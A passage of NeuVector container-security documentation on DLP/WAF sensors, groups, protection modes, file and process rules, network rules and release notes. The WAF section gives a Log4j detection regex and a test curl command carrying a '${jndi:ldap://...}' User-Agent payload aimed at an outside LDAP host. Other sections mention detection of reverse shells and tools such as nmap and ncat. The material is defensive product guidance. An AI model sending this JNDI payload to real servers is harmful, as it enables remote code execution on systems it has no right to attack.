and DLP sensors added to the group, only traffic in or out of the cluster and not between all containers will be inspected. Or if it is a custom group defined as 'namespace=demo' then only traffic in or out of the namespace demo will be inspected, and not any inter-container traffic within the namespace.  It is recommended that WAF sensors be applied only to Groups where incoming (e.g. ingress) connections are expected, unless the sensor(s) apply to specific internal applications (expecting east-west traffic).    DLP/WAF Behavior Summary  DLP pattern matching does not occur for the traffic which is passing among workloads that belong to same DLP group.Any traffic passing in and out of a DLP group is scanned for pattern matches.Cluster ingress and egress traffic is scanned for patterns if the workload is allowed to make ingress/egress connections.Multiple patterns per DLP/WAF rule (max 16 patterns are allowed per rule).Multiple alerts are generated for a single packet if it matches multiple rules.For performance reasons, only the first 16 rules are alerted and matched even if the packet matches more than 16 rules.Alerts are aggregated and reported together if same rule matches and alerts multiple times within 2 seconds.PCRE is used for pattern matching.Hyper scan library is used for efficient, scalable and high-performance pattern matching.  DLP/WAF Actions in Discover, Monitor, Protect Modes​  When adding sensors to groups, the DLP/WAF action can be set to Alert or Deny, with the following behavior if there is a match:  Discover mode. The action will always be to alert, regardless of the setting Alert/Deny.Monitor mode. The action will always be to alert, regardless of the setting Alert/Deny.Protect mode. The action will be to alert if set to Alert, or block if set to Deny.  Log4j Detection WAF Pattern​  The WAF-like rule to detect the Log4j attempted exploit is below. Please note this should only be applied to Groups expecting ingress web connections.  \\$\\{((\\$|\\{|\\s|lower|upper|\\:|\\-|\\})*[jJ](\\$|\\{|\\s|lower|upper|\\:|\\-|\\})*[nN](\\$|\\{|\\s|lower|upper|\\:|\\-|\\})*[dD](\\$|\\{|\\s|lower|upper|\\:|\\-|\\})*[iI])((\\$|\\{|\\s|lower|upper|\\:|\\-|\\})|[ldapLDAPrmiRMIdnsDNShttpHTTP])*\\:\\/\\/.*   Also note that there are ways that attackers could bypass detection by such rules.  Testing the Log4j WAF Detection​  In an attempted exploit, the attacker will construct an initial jndi: insertion and include it in the User-Agent HTTP Header:  User-Agent: ${jndi:ldap://enq0u7nftpr.m.example.com:80/cf-198-41-223-33.cloudflare.com.gu}   Using curl to POST data to server(container) can help to test WAF rule:  curl -X POST -k -H &quot;X-Auth-Token: $_TOKEN_&quot; -H &quot;Content-Type: application/json&quot; -H &quot;User-Agent: ${jndi:ldap://enq0u7nftpr.m.example.com:80/cf-198-41-223-33.cloudflare.com.gu}&quot; -d '$SOME_DATA' &quot;http://$SOME_IP_:$PORT&quot;   WAF Setup and Testing​  The downloadable file below provides an unsupported script for creating WAF sensors via CRD and running common WAF rule tests against those sensors.

It is also used to switch modes of Groups between Discover, Monitor, and Protect. Container Groups can have Process/File rules in a different mode than Network rules, as described here. Please see the following individual sections for explanations of Custom Compliance Checks, Network Rules, Process and File Access Rules and DLP/WAF detection. Note: Network rules can be viewed in the Groups menu for any group, but must be edited separately in the Network Rules menu.  NeuVector automatically creates Groups from your running applications. These groups start with the prefix 'nv.' You can also manually add them using a CRD or the REST API and can be created in any mode, Discover, Monitor, or Protect. Network and Response Rules require these Group definitions. For automatically created Groups ('learned' groups starting with 'nv'), NeuVector will learn the network and process rules and add them while in Discover mode. Custom Groups will not auto-learn and populate rules. Note: 'nv.' groups start with zero drift enabled by default for process/file protections.    It is convenient to see groups of containers and apply rules to each group. NeuVector creates a list of groups based on the container images. For example, all containers started from one Wordpress image will be in the same group. Rules are automatically created and applied to the group of containers.  The Groups screen also displays a 'Scorable' icon in the upper right, and a learned group can be selected and the Scorable checkbox enabled or disabled. This controls which containers are used to calculate the Security Risk Score in the Dashboard. See Improve Security Risk Score for more details.  The Groups screen is also where the CRD yaml file for 'security policy as code' can be imported and exported. Select one or more groups and click on the Export Group policy button to download the yaml file. See the CRD section for more details on how to use CRDs. Important: Each selected group AND any linked groups through network rules will be exported (i.e. the group and any other group it connects to through the whitelist network rules).  Auto Deletion of Unused Groups​  Learned groups (not reserved or custom groups) can be automatically deleted by NeuVector if there are no members (containers) in the group. The time period for this is configurable in Settings -&gt; Configuration.  Host Protection - the 'Nodes' Group​  NeuVector automatically creates a group called 'nodes' which represents each node (host) in the cluster. NeuVector provides automated basic monitoring of hosts for suspicious processes (such as port scans, reverse shells etc.) and privilege escalations. In addition, NeuVector will learn the process behavior of each node while it is in Discover mode to whitelist those processes, similar to how it is done with container processes. The 'local' (learned) process rule list is a combination of all processes from all nodes in the cluster while in Discover mode.  The nodes can then be put into the Monitor or Protect mode, where NeuVector will alert is any process starts while in Monitor mode, and block that process in Protect mode.    To enable host protection with process profile rules, select the 'nodes' group and review the learned processes on the node. Customize if needed by adding, deleting or editing process rules. Then switch the mode to Monitor or Protect.  note Network connection violations of rules shown in the Network Rules for Nodes are never blocked, even in Protect mode. Only process violations are blocked in Protect mode on nodes.  Custom Groups​  Groups can be manually added by entering the criteria for the group. Note: Custom created groups don't have a Protection mode. This is because they may contain containers from different underlying groups, each of which may be in a different mode, causing confusion about the behavior.  Groups can be created by:  Images  Select containers by their image names. Examples: image=wordpress, image@redis  Nodes  Select containers by nodes on which they are running. Examples: node=ip-12-34-56-78.us-west-2  Individual containers  Select containers by their instance names. Examples: container=nodejs_1, container@nodejs  Services  Select containers by their services. If a container is deployed by Docker Compose, its service tag value will be &quot;project_name:service_name&quot;; if a container is deployed by Docker swarm mode service, its service tag value will be the swarm service name.  Labels  Select containers by their labels. Examples: com.docker.compose.project=wordpress, location@us-west  Addresses  Create a group by DNS name or IP address ranges. Examples: address=www.google.com, address=10.1.0.1, address=10.1.0.0/24, address=10.1.0.1-10.1.0.25. DNS name can be any name resolvable. Address criteria do not accept the != operator. See below for special virtual host 'vh' address groups.  A group can be created with mixed criteria types, except the 'address' type, which cannot be used together with other criteria. Mixed criteria enforces an ‘AND’ operation between the criteria, for example label service_type=data AND image=mysql. Multiple entries for one or criteria are treated as OR, for example address=google.com OR address=yahoo.com. Note: To assist in analyzing ingress/egress connections, a list of ingress and egress IPs can be downloaded from the Dashboard -&gt; Ingress/Egress details section as an Exposure Report.  Partial matching is supported for image, node, container, service and label criteria. For example, image@redis, selects containers whose image name contains 'redis' substring; image^redis, selects containers whose image name starts with 'redis'.  It is not recommended to use address criteria to match internal IPs or subnets, especially those protected by enforcers, instead, using their meta data, such as image, service or labels, is recommended. The typical use cases for address group are to define policies between managed containers and external IP subnets, for example, services running on Internet or another data center. Address group does not have group members.  Wildcards '' can be used in criteria, for example 'address=.google.com'. For more flexible matching, use the tilde '' to indicate a regex match is desired. For example to match labels 'policypublic.*-ext1' for the label policy.  note Special characters used after an equals '=' in criteria may not match properly. For example the dot '.' In 'policy=public.' will not match properly, and regex match should be used instead, like 'policy~public.'  After saving a new group, NeuVector will display the members in that group. Rules can then be created using these groups.  Virtual Host ('vh') Based Network Policy​  Custom groups can support virtual host based address groups. This enables a use case where two different FQDN addresses are resolved to the same IP address, but different rules for each FQDN should be enforced. A new custom group with ‘address=vh:xxx.yyy’ can be created using the ‘vh:’ indicator to enable this protection. A network rule can then use the custom group as the ‘From’ source based on the virtual hostname (instead of resolved IP address) to enforce different rules for virtual hosts.

One is Zero-drift, where allowed process and file activity are automatically determined based on the container image, and second is a behavioral learning based. Each can be customized (rules added manually) if desired.  NeuVector has built-in detection of suspicious file system activity. Sensitive files in containers normally do not change at run-time. By modifying the content of the sensitive files, an attacker can gain unauthorized privileges, such as in the Dirty-Cow linux kernel attack, or damage the system’s integrity, for example by manipulating the /etc/hosts file. Most containers don't run in read-only mode. Any suspicious activity in containers, hosts, or the NeuVector Enforcer container itself will be detected and logged into Notifications -&gt; Security Events.  Zero-drift File Protection​  This is the default mode for process and file protections. Zero-drift automatically allows only processes which originate from the parent process that is in the original container image, and does not allow file updates or new files to be installed. When in Discover or Monitor mode, zero-drift will alert on any suspicious process or file activity. In Protect mode, it will block such activity. Zero-drift does not require file activity to be added to an allow-list. Disabling zero-drift for a group will cause the process and file rules listed for the group to take effect instead.  note The process/file rules listed for each group are always applied, even when zero-drift is enabled. This offers a way to add allow/deny exceptions to the base zero-drift protections. Keep in mind that if a group starts in Discover mode, process/file rules can be automatically added to the list, and should be reviewed and edited before moving to Monitor/Protect modes.  The ability to enable/disable zero-drift mode is in the console in Policy -&gt; Groups. Multiple groups can be selected to toggle this setting for all selected groups.  Basic File Protections​  If a package installation is detected, an automatic re-scan of the container or host will be triggered to detect any vulnerabilities, IF auto-scan has been enabled in Security Risks -&gt; Vulnerabilities.  In addition to monitoring predefined files/directories, users can add custom files/directories to be monitored, and block such files/directories from being modified.  important NeuVector alerts, and does not block modifications to predefined files/directories or in system containers such as Kubernetes ones. Blocking is only an option for user configured custom files/directories for non-system containers. This is so that regular updates of system folder or sensitive configurations are not blocked unintentionally, resulting in erratic system behavior.  The following files and directories are monitored by default:  Executable filesSensitive setuid/setgid filesSystem libraries, libc, pthread, ...Package installation, Debian/Ubuntu, RedHat/CentOS, AlpineSensitive system files, /etc/passwd, /etc/hosts, /etc/resolv.conf …Running processes' executable files  The following activities are monitored:  Files, directories, symlinks (hard link and soft link)created, deleted, modified (content change) and moved  Below is a list of the file system monitoring and what is monitored (container, host/node, and/or NeuVector enforcer container itself):  /bin, /usr/bin, /usr/sbin, /usr/local/bin - container, enforcerFiles of setuid and setgid attribute - container, host, enforcerLibraries: libc, pthread, ld-linux.* - container, host, enforcerPackage installation: dpkg, rpm, apk - container, host, enforcer/etc/hosts, /etc/passwd, /etc/resolv.conf - container, host, enforcerBinaries of the running processes - container  Behavioral-learning based Allowed Applications in Discover Mode​  When in Discover mode, NeuVector can learn and whitelist applications ONLY for specified directories or files. To enable learning, a custom rule must be created and the Action must be set to Block, as described below.  Creating Custom File/Directory Monitoring Rules​  Custom file access rules can be created for both custom user-defined Groups as well as auto-learned Groups.  Users can add new entries for file/directory rules.  Filter: Configure the file/folder to be protected (wildcards are supported)Set the recursive flag (if all files in the subdirectories are to be protected)Select the action, Monitor or Block (see Actions below)Enter allowed applications (see Note1 below)    Actions:  Monitor file changes. Generate alerts (Notifications) for any changesBlock unauthorized access. Service in Discover mode: the file access behavior is learned (the processes/applications that access the protected file) and added to the Allowed Applications.Service in Monitor mode: unexpected file behavior is alerted.Service in Protect mode: unexpected access (read, modify) is blocked. New file creation in protected folders will be blocked as well.  note If the rule is set to Block, and the service is in Discover mode, NeuVector will learn the applications accessing the file and add these to the Allowed Applications for the rule.  note Container platforms running the AUFS storage driver will not support the deny (block) action in Protect mode for creating/modifying files due to the limitations of the driver. The behavior will be the same a Monitor mode, alerting upon suspicious activity.  File access rule order precedence​  A container can inherit file access rule from multiple custom groups and user created file access rule on auto learned group.  File access rules are prioritized in the order below if the file name conflicts with predefined access rules of auto learned group and rules inheritance of multiple groups.  File access rule with block access (highest order)File access rule with recursive enabledFile access rule with recursive disableUser created file access rule other than predefined file access rules  Examples​  Showing file access rule to protect /etc/hostname file of node-pod service and allow vi application to modify the file.    Showing file access rule to protect files under /var/opt/ directory recursively for modification as well reading. The Allowed Application python can have read and modify access to these files.    Showing access rule that protects file /etc/passwd, which is one of the files covered predefined access rule in order to modify the file access action, for modification as well reading. This custom rule changes the default action of the predefined file access rule. The application Nano can have 'read and modify' access to these files. Must also add the Nano application (process) as an 'allow' rule in the process profile rule for this service to run Nano application inside the service (if it wasn't already whitelisted there), otherwise the process will be blocked by NeuVector.    Showing that the application python was learned accessing file under /var/opt directory when service mode of node-pod was in Discover. This occurs only when the rule is set to Block and the service is in Discover mode.    Showing predefined file access rules for the service node-pod.demo-nvqa. This can be viewed for this service by clicking the info icon “show predefined filters” in the right corner of the file access rule tab.    Showing a sample security event in Notifications -&gt; Security Events, alerted as File access denial when modification of the file /etc/hostname by the application python was denied due to a custom file access rule with block action.    Other Responses​  If other special mitigations, responses, or alerts are desired for File System Violations, a Response Rule can be created.

At any point in time, any Group (beginning with 'nv', or the 'Nodes' group) can be in any of these modes. The mode can be switched from the Groups menu, Network Activity view, or the Dashboard. Container Groups can have Process/File rules in a different mode than Network rules, as described here.    note Custom created groups don't have a Protection mode. This is because they may contain containers from different underlying groups, each of which may be in a different mode, causing confusion about the behavior.  Discover​  By default, NeuVector starts in Discover mode. In this mode, NeuVector:  Discovers your container infrastructure, including containers, nodes, and hosts.Learns your applications and behaviors by observing conversations (network connections) between containers.Identifies separate services and applications running.Automatically builds a whitelist of Network Rules to protect normal application network behavior.Baselines the processes running in containers for each service and creates whitelist Process Profile Rules.  note To determine how long to run a service in Discover mode, run test traffic through the application and review all rules for completeness. Several hours should be sufficient, but some applications may require a few days to be fully exercised. When in doubt, switch to Monitor mode and check for violations, which can then be converted to whitelist rules before moving to Protect mode.  Monitor​  In Monitor mode NeuVector monitors conversations and detects run-time violations of your Security Policy. In this mode, no new rules are created by NeuVector, but rules can manually be added at any time.  When violations are detected, they are visible in the Network Activity map visually by a red line. Violations are also logged and displayed in the Notifications tab. Process profile rule and file access violations are logged into Notifications -&gt; Security Events.  In the Network map you can click on any conversation (green, yellow, red line) to display more details about the type of connection and protocol last monitored. You can also use the Search and Filter by Group buttons in the lower right to narrow the display of your containers.  Protect​  In Protect mode, NeuVector enforcers will block (deny) any network violations and attacks detected. Violations are shown in the Network map with a red ‘x’ in them, meaning they have been blocked. Unauthorized processes and file access will also be blocked in Protect mode. DLP sensors which match will block network connections.  ","version":"5.3","tagName":"h3"},{"title":"Switching Between Modes​","type":1,"pageTitle":"Modes: Discover, Monitor, Protect","url":"/policy/modes#switching-between-modes","content":" You can easily switch NeuVector Groups from one mode to another. Remember that in Discover mode, NeuVector is building a Security Policy for allowed, normal container behavior. You can see these rules in the Policy -&gt; Groups tab or in detail in the Policy -&gt; Network Rules menu.  When you switch from Discover to Monitor mode, NeuVector will flag all violations of normal behavior not explicitly allowed. Because NeuVector enforces policy based on applications and groups with similar attributes, it’s typically not necessary to add or edit rules when scaling up or scaling down containers.  Please ensure that, before introducing new updates that result in new types of connections between containers, you switch the affected Service(s) to Discover mode to learn these new behaviors. Alternatively, you can manually add new rules while in any mode, or edit the CRD used to create the rules to add new behaviors.  New Service Mode​  If new services are discovered by NeuVector, for example a previously unknown container starts running, it can be set to a default mode. In Discover mode, NeuVector will start to learn its behavior and build Rules. In Monitor, a violation will be generated when connections to the new service are detected. In Protect, all connections to the new service will be blocked unless the rules have been created prior.    Network Service Policy Mode​  There is a global setting available in Settings -&gt; Configuration to separately set the network protection mode for enforcement of network rules. Enabling this (default is disabled), causes all network rules to be in the protection mode selected (Discover, Monitor, Protect), while process/file rules remain in the protection mode for that Group, as displayed in the Policy -&gt; Groups screen. In this way, network rules can be set to Protect (blocking), while process/file policy can be set to Monitor, or vice versa.  Automated Promotion of Group Modes​  Promotes a Group’s protection Mode based on elapsed time and criteria. This automation does not apply to CRD created Groups. This features allows a new application to run in Discover for some time period, learning the behavior and NeuVector creating allow-list rules for Network and Process, then automatically moving to Monitor, then Protect mode.  The criterion for moving from Discover to Monitor mode is: elapsed time for learning all network and process activity of at least one live pod in the Group. For example, if this is set to 7 days, then 7 days after a running pod for the group is detected, the mode will be automatically promoted to Monitor.  The criterion for moving from Monitor to Protect mode is: there are no security events (network, process etc) for the timeframe set for the Group. For example, if this is set to 14 days, then if no violations (network, process, file) are triggered for 14 days (e.g. the quiet period), then the mode is automatically promoted to Protect. If there are no running pods in the group, the promotion will not occur.    Conflict Resolution Between Services In Different Modes​  For network connections between containers in different service groups, if their policy modes are different, the following table shows how the system resolves the conflicts.

You can also manually add them in any mode, Discover, Monitor, or Protect. Rules can be added or edited from the CLI or REST API.  NeuVector uses a declarative policy which consist of rules which govern allowed and denied application layer connections. NeuVector analyzes and protects based on not only IP address and port, but by determining the actual network behavior based on application protocols. This enables NeuVector to automatically protect any new application containers regardless of IP address and port.  Network rules specify ALLOWED or DENIED behavior for your applications. These rules determine what connections are normal behavior for your services as well as what are violations. You can delete automatically ‘learned’ rules as well as add new rules to your policy.  important Network rules are enforced in the order that they appear in the list, from top to bottom.

In many cases, since NeuVector does not recognize this network it will classify it as an ‘External’ network, even if it is an internal network.  To allow containers to connect to services on other internal networks, first create a group, then a rule for it.  Create a Group. In Policy -&gt; Groups, click to add a new Group. Name the group (e.g. internal) then specify the criteria for the group. For example, specify the DNS name, IP address or address range of the internal services. Save the new group. Create a Rule. In Policy -&gt; Rules, click to add a new rule. Select the group representing the container From which the connections will originate, then the To group (e.g. internal). You can further refine the rule with specific protocols or ports, or leave blank. Make sure the selector is set to Allow (green).  Be sure to click Deploy to save the new rule.  Finally, review the list of rules to make sure the new rule is in the order and priority desired. Rules are applied from top to bottom.  Ingress IP Policy Based on X-FORWARDED-FOR​  In a Kubernetes cluster, an application can be exposed to the outside of the cluster by a NodePort, LoadBalancer or Ingress services. These services typically replace the source IP while doing the Source NAT (SNAT) on the packets. As the original source IP is masqueraded, this prevents NeuVector from recognizing the connection is actually from the 'external'.  In order to preserve the original source IP address, the user needs to add the following line to the exposed services, in the 'spec' section of the external facing load balancer or ingress controller. (Ref: https://kubernetes.io/docs/tutorials/services/source-ip/)  &quot;externalTrafficPolicy&quot;:&quot;Local&quot;   Many implementations of LoadBalancer services and Ingress controllers will add the X-FORWARDED-FOR line to the HTTP request header to communicate the real source IP to the backend applications. This product can recognize this set of HTTP headers, identify the original source IP and enforce the policy according to that.  This improvement created some unexpected issues in some setup. If the above line has been added to the exposed services and NeuVector network policies have been created in a way that expect the network connections are coming from internal proxy/ingress services, because we now identify the connections are from &quot;external&quot; to the cluster, normal application traffic might trigger alerts or get blocked if the applications are put in &quot;Protect&quot; mode.  A switch is available to disable this feature. Disabling it tells NeuVector not to identify that the connection is from &quot;external&quot; using X-FORWARDED-FOR headers. By default this is enabled, and the X-FORWARDED-FOR header is used in policy enforcement. To disable it, go to Settings -&gt; Configuration, and disable the &quot;X-Forwarded-For based policy match&quot; setting.  Special Enforcement for Istio ServiceEntry Destinations​  Egress network policy enforcement functionality was added in version 5.1.0 for pods to ServiceEntry destinations declared with Istio. Typically, a ServiceEntry defines how an external service referred by DNS name is resolved to a destination IP. Prior to v5.1, NeuVector could not detect and enforce rules for connections to a ServiceEntry, so all connections were classified as External. With 5.1, rules can be enforced for specific ServiceEntry destinations. Implicit violations will be reported for newly visible traffic if allow rules don't exist. These rules can be learned and auto-created under Discover mode. To allow this traffic, you can put the group into discover mode or create a custom group with destination addresses (or DNS name) and add a new network rule to this destination to allow the traffic.  Virtual Host Based Network Policy​  Custom groups can support virtual host based address groups. This enables a use case where two different FQDN addresses are resolved to the same IP address, but different rules for each FQDN should be enforced. A new custom group with ‘address=vh:xxx.yyy’ can be created using the ‘vh:’ indicator to enable this protection. A network rule can then use the custom group as the ‘From’ source based on the virtual hostname (instead of resolved IP address) to enforce different rules for virtual hosts.

Groups​  This provides the primary view of service Groups and custom Groups to set the mode (Discover, Monitor, Protect) for each service and to manage rules. Groups are automatically created by NeuVector, but custom groups can be added. Rules for each Group are automatically created by NeuVector when containers begin running. Container Groups can have a Split Policy Mode where the Process/File rules are in a different enforcement mode than the Network rules, as described here.  To select a Group to view or manage, select the check box next to it. This is where Process Profile Rules, File Access Rules, DLP, and Custom Compliance checks are managed. Network Rules can be viewed here but are managed in a separate menu. Network and Response Rules in NeuVector are created using a ‘from’ and ‘to’ field, which requires a Group as input. A group can be an application, derived from image labels, DNS name or other customized grouping. DNS subdomains are supported, e.g. *.foo.com. IP addresses or subnets can also be used which is useful to control ingress and egress from non-containerized workloads.    Reserved group names created automatically by NeuVector include:  Containers. All running containers.External. Connections coming into the cluster (ingress).Nodes. Nodes or hosts identified by NeuVector.  The Groups menu is also where the &quot;Export Group Policy&quot; can be performed. This exports the security policy (rules) for the selected groups as a yaml file in the format of the NeuVector custom resource definition (CRD) which can be reviewed and then deployed into other clusters.  Note that the Status of a Group's containers is shown in Policy -&gt; Groups -&gt; Members, which indicates the NeuVector protection mode (Discover, Monitor, Protect). If the container is shown in an 'Exit' state, it is still on the host but is stopped. Removing the container will remove it from an Exit state.  Network Rules​  A list of whitelist and blacklist rules for NeuVector to enforce. NeuVector can auto-discover and create a set of whitelist rules while in Discover mode. Rules can be added manually if desired.  NeuVector automatically creates Layer 7 (application layer) whitelist rules when in Discover mode, by observing the network connections and creating rules which enforce application protocols.  NeuVector also has built-in network attack detection which is enabled all the time, regardless of mode (Discover, Monitor, Protect). The network threats detected include DDoS attacks, tunneling and SQL injection. Please see the section Network Rules for a full list of built-in threat detection.  DLP (Data Loss Prevention) rules can also be applied to container Groups to inspect the network payload for potential data stealing or privacy violations such as unencrypted credit card data. Violations can be blocked. Please see the section on DLP for details on how to create and apply DLP filters.  Process Profile and File Access Rules​  NeuVector has built-in detection of suspicious processes and file activity as well as a baselining technology for containers. Built-in detection includes processes such as port scanning (e.g. NMAP), reverse shell, and even privilege escalations to root. System files and directories are automatically monitored. Each service discovered by NeuVector will create a baseline of ‘normal’ process and file behavior for that container service. These rules can be customized if desired.  Response Rules​  Response Rules enable users to define actions to respond to security events. Events include Threats, Violations, Incidents, and Vulnerability Scan results. Actions include container quarantine, webhooks, and suppression of alerts.  Response Rules provide a flexible, customizable rule engine to automate responses to important security events.  Admission Control Rules​  Admission control rules allow or block deployments. More details can be found in this section under Admission Controls.  DLP and WAF Sensors​  Data Loss Prevention (Data Leak Protection) and WAF rules can be enabled on any selected container Group. This utilizes Deep Packet Inspection to apply regular expression based matching to the network payload entering or leaving the selected container group. Built-in sensors for credit card and US social security number are included for examples, and custom regular expressions can be added.  Migration, Backup, Import/Export​  Migration of the security policy can be accomplished by CRD, REST API, or import/export. For example, learned and custom rules can generate a CRD yaml file(s) in a staging environment for deployment to the production environment.  The Security Policy for NeuVector can be exported and imported in Settings -&gt; Configuration. It is recommended to backup All configuration prior to any update of NeuVector to a new version.  important Importing ALL (Config and Policy) will overwrite everything, including the main admin login credential.

One is Zero-drift, where allowed process and file activity are automatically determined based on the container image, and second is a behavioral learning based. Each can be customized (rules added manually) if desired.  note There is a limitation when running on systems with the AUFS file system, whereby a race condition can be experienced and the process rules are not enforced for blocking (Protect mode). However, these violations are still reported in the security event logs.  Zero-drift Process Protection​  This is the default mode for process and file protections. Zero-drift automatically allows only processes which originate from the parent process that is in the original container image, and does not allow file updates or new files to be installed. When in Discover or Monitor mode, zero-drift will alert on any suspicious process or file activity. In Protect mode, it will block such activity. Zero-drift does not require processes to be learned or added to an allow-list. Disabling zero-drift for a group will cause the process and file rules listed for the group to take effect instead.  note The process/file rules listed for each group are always applied, even when zero-drift is enabled. This offers a way to add allow/deny exceptions to the base zero-drift protections. Keep in mind that if a group starts in Discover mode, process/file rules can be automatically added to the list, and should be reviewed and edited before moving to Monitor/Protect modes.  The ability to enable/disable zero-drift mode is in the console in Policy -&gt; Groups. Multiple groups can be selected to toggle this setting for all selected groups.  Basic Mode Process Protection​  Zero-drift can be disabled, switching to Basic process protection. Basic protection enforces process/file activity based on the listed process and/or file rules for each Group. This means that there must be a list of process rules and/or file rules in place for protection to occur. Rules can be auto-created through Behavioral Learning while in Discover mode, manually created through the console or rest API, or programmatically created by applying a CRD. With Basic enabled if there are no rules in place, all activity will be alerted/blocked while in Monitor or Protect modes.  Behavioral Learning Based Process Protection​  Process profile rules use baseline learning to profile the processes that should be allowed to run in a group of containers (i.e. a Group). Under normal conditions in a microservices environment, for containers with a particular image, only a limited set of processes by specific users would run. If the container is attacked, the malicious attacker would likely initiate some new programs commonly not seen in this container. These abnormal events can be detected by NeuVector and alerts and actions generated (see also Response Rules).  Process baseline information will be learned and recorded when the service Group is in Discover (learning) mode. When in Monitor or Protect mode, if a process that has not been seen before is newly started, or an old process is started by a different user than before, the event will be detected and alerted as a suspicious process in Monitor mode or alerted and blocked in Protect mode. Users can modify the learned profile to allow or deny (whitelist or blacklist) processes manually if needed.  Note that in addition to baseline processes, NeuVector has built-in detection of common suspicious processes such as nmap, reverse shell etc. These will be detected and alerted/blocked unless explicitly white listed for each container service.  important Kubernetes liveness probes are automatically allowed, and added to the learned process rules even in Monitor/Protect mode.  Process Rules for Nodes​  The special reserved group 'nodes' can be configured to enforce process profile rules on each node (host) in the cluster. Select the group 'nodes' and review the process rules, editing if required. Then switch the protection mode to Monitor or Protect. The 'local' (learned) process rule list is a combination of all processes from all nodes in the cluster while in Discover mode.  Process Rules for Custom Groups​  For user defined custom Groups, process rules, if desired, must be manually added. Custom Groups do not learn process rules automatically.  Process Rules Precedence​  Process rules can exist for user defined custom Groups as well as auto-learned Groups. Rules created for custom Groups take precedence over rules for auto-learned Groups.  For the process rule list within any Group, the rule order in the console determines its precedence. The top rules listed are matched first before the ones below it.  Process rules with name and path both containing wildcards take precedence over other rules to Allow action. A Deny action is not allowed with both wildcards to avoid blocking all processes.  Process rules with a Deny action and wildcard in the name will take precedence over Allow actions with wildcard in the name.  Discover mode​  All new processed are profiled with action allowUsers can change the action into 'deny' for generating alert or blocking when same new process is startedUsers can create a profile for a process with either allow or denyProcess profile rules can contain name and/or pathWildcard * can be used to match all for name or path  note A suspicious process (built-in detect), such as nmap, ncat, etc., is reported as a suspicious process event and will NOT be learned. If a service needs this process, the process needs to be added with an 'allow' profile rule explicitly.  Monitor/Protect mode (new container started in monitor or protect mode)​  Every new process generates an alertProcess profile rules can contain name and/or pathWildcard * can be used to match all for name or path  If a) process matches a deny rule, or b) process is not in the list of allow rules, then:  In Monitor mode, alerts will be generatedIn Protect mode, processes will be blocked and alerts generated  note Container platforms with the AUFS storage driver will introduce a delay in blocking mechanism due to the driver’s limitations.  note In Protect mode, system containers such as Kubernetes ones, will not enable the block action but will generate a process violation event if there is a process violation.  Creating process profile rules​  Multiple rules can be created for the same process. The rules are executed sequentially and the first matching rule will be executed.  Click Add rule (+) from process profile rules tabProcess profile rules can contain name and/or pathWildcard * can be used to match all for name or path  Example: To allow the ping process to run from any directory    Violations will be logged in Notifications -&gt; Security Events.

Please see release notes section Integrations &amp; Other Components for details.  4.1.2 February 2021​  Enhancements​  Enable toggling for XFF-forwarding to disable the NeuVector policy from using it, which is enabled by default. This is related to a function added in 4.1.1 to add support for x-forwarded-* headers. To disable, go to Settings -&gt; Configuration. IMPORTANT: See the detailed description of the behavior of XFF-FORWARDED-FOR below.  Bug Fixes​  Fixed that CVE-2020-1938 is not detected.Fix error from Manager &quot;Failed to export configurations of section {policy, user, config}.&quot;Fix Network Activity Graph filter is not working.Improve controller CPU and memory consumption.  Other​  Jenkins plug-in updated to support stand alone scanner. Please see release notes section Integrations &amp; Other Components for details.  XFF-FORWARDED-FOR Behavior Details​  In a Kubernetes cluster, an application can be exposed to the outside of the cluster by a NodePort, LoadBalancer or Ingress services. These services typically replace the source IP while doing the Source NAT (SNAT) on the packets. As the original source IP is masqueraded, this prevents NeuVector from recognizing the connection is actually from the 'external'.  In order to preserve the original source IP address, the user needs to add the following line to the exposed services, in the 'spec' section of the external facing load balancer or ingress controller. (Ref: https://kubernetes.io/docs/tutorials/services/source-ip/)  &quot;externalTrafficPolicy&quot;:&quot;Local&quot;  Many implementations of LoadBalancer services and Ingress controllers will add the X-FORWARDED-FOR line to the HTTP request header to communicate the real source IP to the backend applications. In 4.1.0 release, we added a feature to recognize this set of HTTP headers, identify the original source IP and enforce the policy according to that.  This improvement created some unexpected issues in some setup. If the above line has been added to the exposed services and NeuVector network policies have been created in a way that expect the network connections are coming from internal proxy/ingress services, because we now identify the connections are from &quot;external&quot; to the cluster, normal application traffic might trigger alerts or get blocked if the applications are put in &quot;Protect&quot; mode.  In 4.1.2, switch is added to disable this feature. Disabling it tells NeuVector not to identify that the connection is from &quot;external&quot; using X-FORWARDED-FOR headers. By default this is enabled, and the X-FORWARDED-FOR header is used in policy enforcement. To disable it, go to Settings -&gt; Configuration, and disable the &quot;X-Forwarded-For based policy match&quot; setting.    4.1.1 January 2021​  Bug Fixes​  Add support for AWS EKS AMI Release v20210112 to fix ulimit issues.  4.1 December 2020​  Enhancements​  Allow users to change policy mode when exporting CRD.OIDC support claims from /oauth/userinfo endpoint.Cluster node refresh support to allow temporary support for node growth and migration of pods between nodes.Generate a usage report for download from the Settings -&gt; Configuration page.Wildcard support on namespace when assigning user roles to namespace.Improve group/policy removal logic. Configurable setting for when an unused group is removed based on the amount of time since it was last used.Allow user to configure packet capture duration.Add support for Multi-cluster management reader role.Stand alone scanner now submits scan result using REST API. See below for Scanner Details.Detect and block Man-in-the-middle attack reported in CVE-2020-8554.Add support for metered (usage based) licensing models.Remove step for creation of CRDs (e.g. NvSecurityRule) from the sample deployment yamls for Kubernetes and Openshift. This is not required (Controller will create these automatically). Helm deployment will also take care of these.  Bug Fixes​  Improve high memory usage on controller and enforcer.Error returned when trying to configure a registry filter. Allow wildcard be used any place in the repo/tag filter.Block policy not working as expected. Add support for x-forwarded-* headers. IMPORTANT: See the detailed description of the behavior of XFF-FORWARDED-FOR above as part of the 4.1.2 release notes.Helm Chart error when setting controller ingress to true.Unable to create add and save network rule, due to gateway timeout.Configmap examples are missing Group_Claim field. Added to configmap documentation.Process profile violation when terminating Controller pod.  Scanner Details​  Two additional environment variables are added in order to login to controller REST API. Users with CICD integration role can submit the results.  New Environment Variables: SCANNER_CTRL_API_USERNAME, SCANNER_CTRL_API_PASSWORD  Usage Example  docker run --name neuvector.scanner --rm -e SCANNER_REPOSITORY=ubuntu -e SCANNER_TAG=16.04 -e SCANNER_LICENSE=$license -e CLUSTER_JOIN_ADDR=10.1.2.3 CLUSTER_JOIN_PORT=32368 -e SCANNER_CTRL_API_USERNAME=username -e SCANNER_CTRL_API_PASSWORD=secret -v /var/run/docker.sock:/var/run/docker.sock -v /var/neuvector:/var/neuvector neuvector/scanner   Kubernetes 1.19+ and CRD Exports​  important To use an exported CRD with Kubernetes 1.19+, please remove the 'version: v1' from each section. This can be found at the end or near the end of each section in an exported Group policy CRD.   version: v1   4.0.3 December 2020​  Bug Fixes​  Process profile violation occurring when terminating Controller pod.Implicit 